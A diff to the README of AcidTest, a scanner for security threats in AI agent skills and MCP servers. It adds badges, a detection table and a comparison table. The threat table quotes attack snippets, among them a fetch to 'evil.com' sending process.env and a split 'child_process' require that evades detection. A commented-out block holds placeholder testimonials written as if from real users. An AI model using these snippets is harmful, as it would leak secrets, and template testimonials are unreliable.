@@ -1,6 +1,32 @@
 # AcidTest
 
-Security scanner for AI agent skills and MCP servers. Scan before you install.
+<p align="center">
+  <strong>Security scanner for AI agent skills and MCP servers. Scan before you install.</strong>
+</p>
+
+<p align="center">
+  <a href="https://www.npmjs.com/package/acidtest">
+    <img src="https://img.shields.io/npm/v/acidtest" alt="npm version">
+  </a>
+  <a href="https://github.com/currentlycurrently/acidtest/actions">
+    <img src="https://img.shields.io/github/actions/workflow/status/currentlycurrently/acidtest/test.yml?branch=main" alt="build status">
+  </a>
+  <a href="https://github.com/currentlycurrently/acidtest">
+    <img src="https://img.shields.io/github/stars/currentlycurrently/acidtest?style=social" alt="GitHub stars">
+  </a>
+  <a href="https://www.npmjs.com/package/acidtest">
+    <img src="https://img.shields.io/npm/dm/acidtest" alt="npm downloads">
+  </a>
+  <a href="./LICENSE">
+    <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="license">
+  </a>
+</p>
+
+---
+
+<p align="center">
+  <img src="assets/demo.gif" width="800" alt="AcidTest Demo">
+</p>
 
 ## The Problem
 
@@ -36,7 +62,7 @@ No API keys. No configuration. No Python.
 
 ## Example Output
 ```
-AcidTest v0.5.0
+AcidTest v0.7.0
 
 Scanning: proactive-agent
 Source:   test-skills/proactive-agent-1-2-4-1
@@ -64,22 +90,25 @@ FINDINGS
 RECOMMENDATION: Do not install. Prompt injection attempt detected.
 ```
 
-## What It Detects
+## What AcidTest Catches
 
-**For AgentSkills:**
-- Prompt injection attempts
-- Undeclared network calls
-- Credential harvesting
-- Permission mismatches
-- Data exfiltration patterns
-- Obfuscated payloads (regex + entropy analysis)
+| Threat | Example | Detection Method |
+|--------|---------|------------------|
+| **Arbitrary Code Execution** | `eval(userInput)`, `new Function()` | AST analysis + pattern matching |
+| **Data Exfiltration** | `fetch('evil.com', {body: process.env})` | Cross-reference layer |
+| **Hardcoded Credentials** | `apiKey = "sk_live_..."` | Pattern matching + entropy |
+| **Prompt Injection** | Markdown instruction override | Injection detection layer |
+| **Obfuscation** | Base64/hex encoded payloads | Shannon entropy analysis |
+| **Supply Chain Attacks** | `require('child_' + 'process')` | AST bypass detection |
+| **Permission Escalation** | Undeclared network/filesystem access | Permission audit + crossref |
 
-**For MCP Servers:**
-- Dangerous command execution
-- Undeclared network access (SSE transport)
-- Environment variable credential requests
-- Shell binary access
-- Permission mismatches between manifest and code
+**What AcidTest Doesn't Catch:**
+- Zero-day exploits in Node.js itself
+- Vulnerabilities in npm dependencies (use `npm audit` for this)
+- Runtime behavior outside static analysis scope
+- Sophisticated polymorphic code or advanced VM-level evasion
+
+See [METHODOLOGY.md](./METHODOLOGY.md) for full transparency on capabilities and limitations (~85-90% detection rate).
 
 ## How It Works
 
@@ -95,6 +124,21 @@ AcidTest runs four analysis layers:
 - CI/CD integration via GitHub Actions and pre-commit hooks
 
 Works with both SKILL.md (AgentSkills) and MCP manifests (mcp.json, server.json, package.json).
+
+## Why AcidTest?
+
+| Feature | AcidTest | npm audit | Manual Review | Sandboxing |
+|---------|----------|-----------|---------------|------------|
+| **Speed** | ⚡ <2 seconds | ⚡ <1 second | 🐌 Hours | ⚡ Seconds |
+| **Agent-Specific Threats** | ✅ Yes | ❌ No | ✅ Yes | ⚠️ Partial |
+| **Code Analysis** | ✅ AST + Regex | ❌ Manifest only | ✅ Full | ❌ Runtime only |
+| **Prompt Injection** | ✅ Detects | ❌ N/A | ✅ Detects | ❌ N/A |
+| **Dependency Vulns** | ❌ No | ✅ Yes | ⚠️ Partial | ❌ No |
+| **Setup Required** | 🟢 Zero config | 🟢 Built-in | 🔴 Expert knowledge | 🟡 Complex |
+| **Cost** | 🟢 Free | 🟢 Free | 🔴 Expensive | 🟡 Infrastructure |
+| **Pre-Installation** | ✅ Yes | ✅ Yes | ✅ Yes | ❌ Post-install |
+
+**Defense-in-depth approach:** Use AcidTest **with** `npm audit` and sandboxing for comprehensive security.
 
 ## Install
 ```bash
@@ -285,6 +329,18 @@ See [`hooks/README.md`](hooks/README.md) for installation options and configurat
 ## Scoring
 
 Starts at 100, deducts by severity (CRITICAL: -25, HIGH: -15, MEDIUM: -8, LOW: -3). Score 80+ is PASS, 50-79 is WARN, 20-49 is FAIL, below 20 is DANGER.
+
+<!--
+## Testimonials
+
+TODO: Add testimonials from dogfooding campaign (Task 1 - Phase 2)
+
+> "AcidTest found 3 CRITICAL vulnerabilities in my skill that I completely missed. Required tool for any AI developer."
+> — [Developer Name], Maintainer of [Skill Name]
+
+> "We integrated AcidTest into our CI/CD pipeline. Caught a backdoor in a community contribution before it hit production."
+> — [Company Name]
+-->
 
 ## Contributing
 
